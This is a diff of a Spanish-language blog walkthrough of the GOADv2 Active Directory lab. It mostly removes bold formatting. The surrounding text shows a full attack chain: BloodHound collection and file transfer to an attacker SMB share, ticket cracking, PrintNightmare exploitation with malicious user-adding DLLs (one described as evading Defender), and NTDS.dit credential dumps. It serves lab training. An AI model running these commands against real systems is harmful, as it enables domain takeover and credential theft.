@@ -1300,7 +1300,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   24k angussmoody 21 jul 21:37  20230721213710_users.json
 ```
 
-Pero si tenemos un acceso rdp podemos realizar la extración de la data con una herramienta más completa llamada **[sharphound](https://github.com/BloodHoundAD/SharpHound/releases),**  esta herramienta realiza una extración más completa de los datos, podemos realizarlo de muchas maneras, en este caso vamos a utilizar la herramienta xfreerdp, para tener un acceso remoto al equipo SRV02
+Pero si tenemos un acceso rdp podemos realizar la extración de la data con una herramienta más completa llamada [sharphound](https://github.com/BloodHoundAD/SharpHound/releases),  esta herramienta realiza una extración más completa de los datos, podemos realizarlo de muchas maneras, en este caso vamos a utilizar la herramienta xfreerdp, para tener un acceso remoto al equipo SRV02
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/Bloodhound]
@@ -1309,7 +1309,7 @@ Pero si tenemos un acceso rdp podemos realizar la extración de la data con una 
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%206.png)
 
-vamos a abrimos una cmd y nos pasamos el **[sharphound](https://github.com/BloodHoundAD/SharpHound/releases)** para este caso la versión 1.1.1 tener en cuenta que depende de la versión que utilicemos ésta va a ser compatible con una versión expecifica de [**bloodhound](https://github.com/BloodHoundAD/BloodHound),** en este caso la servipon sharphound 1.1.1 es compatible con bloodhound 4.3.1
+vamos a abrimos una cmd y nos pasamos el [sharphound](https://github.com/BloodHoundAD/SharpHound/releases) para este caso la versión 1.1.1 tener en cuenta que depende de la versión que utilicemos ésta va a ser compatible con una versión expecifica de [bloodhound](https://github.com/BloodHoundAD/BloodHound), en este caso la servipon sharphound 1.1.1 es compatible con bloodhound 4.3.1
 
 Nos creamos un servidor http con python3 es nuestra máquina atacante
 
@@ -1345,7 +1345,7 @@ una vez terminamos de ejecutar los comandos, nos queda como resuldatos unos arch
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2010.png)
 
-descargarmos estos archivos, para este ejemplo lo vamos a realizar con la herramienta impacket-smbserver, pero se podría realizar de muchas formas, como podemos ver en este árticulo de **[ironhackers](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)**
+descargarmos estos archivos, para este ejemplo lo vamos a realizar con la herramienta impacket-smbserver, pero se podría realizar de muchas formas, como podemos ver en este árticulo de [ironhackers](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/SharpHound-v1.1.1]
@@ -1364,7 +1364,7 @@ ahora desde la máquina victima vamos pasando archivo por archico con el comando
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2011.png)
 
-Una vez tenemos los archivos debemos correr la herramienta bloodhound, esta herramienta corre en compañía de neo4j, para realizar la configuración de esta, se puede consultar en la [**wiki**](https://bloodhound.readthedocs.io/en/latest/index.html) oficial de bloodhound, tener en cuenta que para la versión 4.3.1 de bloodhound se debe tener una version de neo4j superior a 4.4.0 en este caso yo cuento con la versión 4.4.1 y le cree un alias en la bashrc para realizar el llamado de la herramienta.
+Una vez tenemos los archivos debemos correr la herramienta bloodhound, esta herramienta corre en compañía de neo4j, para realizar la configuración de esta, se puede consultar en la [wiki](https://bloodhound.readthedocs.io/en/latest/index.html) oficial de bloodhound, tener en cuenta que para la versión 4.3.1 de bloodhound se debe tener una version de neo4j superior a 4.4.0 en este caso yo cuento con la versión 4.4.1 y le cree un alias en la bashrc para realizar el llamado de la herramienta.
 
 Corremos la herramienta con el comando `neo4j console`  en mi caso como dije en el anterior parrafo creé un alias llamado Neo4jcon, para realizarlo de forma  más rápida, una vez la herramienta esté lista nos dará un mensaje de Started
 
@@ -1549,7 +1549,7 @@ vamos a pasar estos Tickets a un archivo para crackearlos, en este caso los TGT 
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Crackear los hash con john the ripper lo que nos da como resultado la contrasena **sexywolfy** la contraseña de **eddard.stark** es un poco más dificil, así que no se logra romper con el diccionario rockyou.txt
+Crackear los hash con john the ripper lo que nos da como resultado la contrasena sexywolfy la contraseña de eddard.stark es un poco más dificil, así que no se logra romper con el diccionario rockyou.txt
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -1636,7 +1636,7 @@ ahora ejecutamos el comando `git checkout -b mydev`
 Cambiado a nueva rama 'mydev'
 ```
 
-Creamo un entorno virtual  **venv** para no interferir con el entorno del host e instala el repositorio que acabamos de clonar, si no tenemos el módulo para crear entornos virtuales nos lo instalamos con el comando `pip3 install virtualenv`
+Creamo un entorno virtual  venv para no interferir con el entorno del host e instala el repositorio que acabamos de clonar, si no tenemos el módulo para crear entornos virtuales nos lo instalamos con el comando `pip3 install virtualenv`
 
 ```csharp
 ┌─[✗]─[root@angussmoody]─[/opt/myimpacket]
@@ -1691,7 +1691,7 @@ Call stack:
   File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 236, in pip_self_version_check
     logger.warning("[present-rich] %s", upgrade_prompt)
   File "/usr/lib/python3.9/logging/__init__.py", line 1454, in warning
-    self._log(WARNING, msg, args, **kwargs)
+    self._log(WARNING, msg, args, kwargs)
   File "/usr/lib/python3.9/logging/__init__.py", line 1585, in _log
     self.handle(record)
   File "/usr/lib/python3.9/logging/__init__.py", line 1595, in handle
@@ -2365,7 +2365,7 @@ Traceback (most recent call last):
 KeyError: 'Cryptodome.Cipher.AES'
 ```
 
-Y así, tenemos toda la información sobre el dominio norte **ntds.dit**
+Y así, tenemos toda la información sobre el dominio norte ntds.dit
 
 Ahora vamos a limpia borrando el equipo que hemos creado con el hash de la cuenta de administrador que acabamos de obtener con el comando
 
@@ -2383,7 +2383,7 @@ Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra
 
 ## PrintNightmare Windows Server 2016
 
-Para explotar printnightmare primero comprobaremos si el spooler está activo en los objetivos, esto lo hacemos con el comando **`cme smb 192.168.56.10-23 -M spooler** para este ataque utilizaremos las credenciales del usuario **`jorah.mormont** con la contraseña **H0nnor!**
+Para explotar printnightmare primero comprobaremos si el spooler está activo en los objetivos, esto lo hacemos con el comando `cme smb 192.168.56.10-23 -M spooler para este ataque utilizaremos las credenciales del usuario `jorah.mormont con la contraseña H0nnor!
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2426,7 +2426,7 @@ Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
 Protocol: [MS-RPRN]: Print System Remote Protocol
 ```
 
-Ahora vamos a preparar un archivo dll para realizar la explotación, esto lo vamos a hacer con un archivo llamado **nightmare.c** aunque podríamos ponerle cualquier nombre, pero para este caso vamos a dejar el que tiene la guía de **[GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#printnightmare)**
+Ahora vamos a preparar un archivo dll para realizar la explotación, esto lo vamos a hacer con un archivo llamado nightmare.c aunque podríamos ponerle cualquier nombre, pero para este caso vamos a dejar el que tiene la guía de [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#printnightmare)
 
 ```c
 #include <windows.h> 
@@ -2457,7 +2457,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-Vamos a archivo con el comando **`x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c`**
+Vamos a archivo con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2469,7 +2469,7 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx   91k angussmoody 15 ago 20:00  nightmare.dll
 ```
 
-Nos vamos a clonar el script de cube0x0 que tiene en su [github](https://github.com/cube0x0/CVE-2021-1675) para realizar este ataque, esto lo hacemos con el comando **`git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare** una vez termina de correr el comando vemos que tenemos un directorio con el script en python`
+Nos vamos a clonar el script de cube0x0 que tiene en su [github](https://github.com/cube0x0/CVE-2021-1675) para realizar este ataque, esto lo hacemos con el comando `git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare una vez termina de correr el comando vemos que tenemos un directorio con el script en python`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2491,7 +2491,7 @@ drwxrwxrwx     - angussmoody 15 ago 20:06  Images
 drwxrwxrwx     - angussmoody 15 ago 20:06  SharpPrintNightmare
 ```
 
-vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando **`smbserver.py -smb2support share`** . nos creamos el recurso compartido
+vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando `smbserver.py -smb2support share` . nos creamos el recurso compartido
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2511,7 +2511,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado **angussmoody** con la contraseña **Passw0rd123.** como lo vimos en el archivo **nightmare.c**
+Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado angussmoody con la contraseña Passw0rd123. como lo vimos en el archivo nightmare.c
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2520,7 +2520,7 @@ SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Stan
 SMB         essos.local     445    MEEREEN          [-] essos.local\angussmoody:Passw0rd123. STATUS_LOGON_FAILURE
 ```
 
-Continuamos probando que el script nos corre sin problemas, esto podemos hacerlo con el comando **`python3 CVE-2021-1675.py -h`** para ver las opciones
+Continuamos probando que el script nos corre sin problemas, esto podemos hacerlo con el comando `python3 CVE-2021-1675.py -h` para ver las opciones
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2562,7 +2562,7 @@ ahora que sabemos que el comando corre vamos a realizar el ataque contra essos.l
 SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
 ```
 
-ahora vamos a correr el script con el comando **`python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'`** para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
+ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2604,7 +2604,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
-Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo **NTDS. dit**  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
+Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2613,7 +2613,7 @@ SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Stan
 SMB         essos.local     445    MEEREEN          [+] essos.local\angussmoody:Passw0rd123. (Pwn3d!)
 ```
 
-con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://www.notion.so/o/sXxBpNeCw0DhoY0ohgUJ/s/xRLIXi9UGNqyXTLpBX40/~/changes/11/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando **`cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds`**
+con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://www.notion.so/o/sXxBpNeCw0DhoY0ohgUJ/s/xRLIXi9UGNqyXTLpBX40/~/changes/11/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.' --ntds`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2646,7 +2646,7 @@ SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/
 
 ## PrintNightmare Windows Server 2019
 
-Ahora vamos a realizar el mismo ataque pero como dice el título en un windows server 2019, se cuenta con dos archivos, pero uno de ellos es detectado por el defender así que en este caso, vamos a ir a la fija con el archivo que realizar el bypass al defender, si quieres ver el archivo anterios puede verlo desde acá **[GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#exploit-on-vulnerable-windows-server-2019-winterfell)** para este ejemplo vamos a llamar el archivo como **nightmare2.c**
+Ahora vamos a realizar el mismo ataque pero como dice el título en un windows server 2019, se cuenta con dos archivos, pero uno de ellos es detectado por el defender así que en este caso, vamos a ir a la fija con el archivo que realizar el bypass al defender, si quieres ver el archivo anterios puede verlo desde acá [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#exploit-on-vulnerable-windows-server-2019-winterfell) para este ejemplo vamos a llamar el archivo como nightmare2.c
 
 ```c
 /*
@@ -2778,7 +2778,7 @@ int main()
 }
 ```
 
-compilamos el archivo c con el comando **`x86_64-w64-mingw32-gcc -shared -o nightmare2.dll nightmare2.c -lnetapi32`**
+compilamos el archivo c con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare2.dll nightmare2.c -lnetapi32`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2798,7 +2798,7 @@ El dominio que vamos a usar para el ataque es north.sevenkingdoms.local que resp
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
 ```
 
-Como en el ataque anterior vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando **`smbserver.py -smb2support share .`** nos creamos el recurso compartido
+Como en el ataque anterior vamos a preparar un recurso compartido smb con la dll vemos que lo tenemos en el directorio que vamos a exponer, ahora con el comando `smbserver.py -smb2support share .` nos creamos el recurso compartido
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2818,7 +2818,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 ```
 
-Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado **angussmoody** con la contraseña ****Test123456789! como lo vimos en el archivo **nightmare2.c**
+Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado angussmoody con la contraseña Test123456789! como lo vimos en el archivo nightmare2.c
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2827,7 +2827,7 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Win
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [-] north.sevenkingdoms.local\angussmoody:Test123456789! STATUS_LOGON_FAILURE
 ```
 
-vamos a realizar el ataque contra **north.sevenkingdoms.local** que responde a la IP **192.168.56.11** y podemos ver que es un Windows 10.0 Build 17763 x64
+vamos a realizar el ataque contra north.sevenkingdoms.local que responde a la IP 192.168.56.11 y podemos ver que es un Windows 10.0 Build 17763 x64
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2835,7 +2835,7 @@ vamos a realizar el ataque contra **north.sevenkingdoms.local** que responde a l
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
 ```
 
-ahora vamos a correr el script con el comando **`python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'**` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
+ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2877,7 +2877,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
-Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  **`cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'`** y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo **NTDS. dit**  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
+Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2886,7 +2886,7 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Win
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] north.sevenkingdoms.local\angussmoody:Test123456789! (Pwn3d!)
 ```
 
-con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac)** para este caso vamos a hacerlo con crackmapexec con el comando **`cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds`**
+con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac) para este caso vamos a hacerlo con crackmapexec con el comando `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
